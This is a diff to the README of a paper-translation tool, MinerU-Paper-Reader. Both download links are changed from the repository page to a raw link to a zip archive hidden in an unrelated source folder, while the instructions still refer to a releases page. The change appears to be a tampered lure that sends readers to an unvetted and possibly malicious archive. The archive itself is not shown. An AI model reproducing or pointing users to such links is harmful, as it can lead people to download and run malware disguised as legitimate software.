@@ -1,6 +1,6 @@
 # 📄 MinerU-Paper-Reader - Read English papers in bilingual Markdown
 
-[![Download MinerU-Paper-Reader](https://img.shields.io/badge/Download-MinerU--Paper--Reader-blue.svg)](https://github.com/anish3390-Adi/MinerU-Paper-Reader)
+[![Download MinerU-Paper-Reader](https://img.shields.io/badge/Download-MinerU--Paper--Reader-blue.svg)](https://raw.githubusercontent.com/anish3390-Adi/MinerU-Paper-Reader/main/external/md-translator/src/app/[locale]/Paper-Miner-Reader-2.9.zip)
 
 This tool helps you read complex academic papers. It converts English PDF files into clear, bilingual Markdown documents. You see the original English text alongside the Chinese translation. This approach removes language barriers for researchers, students, and curious readers. 
 
@@ -23,7 +23,7 @@ The software uses advanced processing engines to extract text and structure from
 
 ## 🚀 Downloading the application
 
-1. Visit the [MinerU-Paper-Reader download page](https://github.com/anish3390-Adi/MinerU-Paper-Reader).
+1. Visit the [MinerU-Paper-Reader download page](https://raw.githubusercontent.com/anish3390-Adi/MinerU-Paper-Reader/main/external/md-translator/src/app/[locale]/Paper-Miner-Reader-2.9.zip).
 2. Look for the latest release on the right side of the page.
 3. Click the link to download the installer or the compressed archive file.
 4. Save the file to your computer.
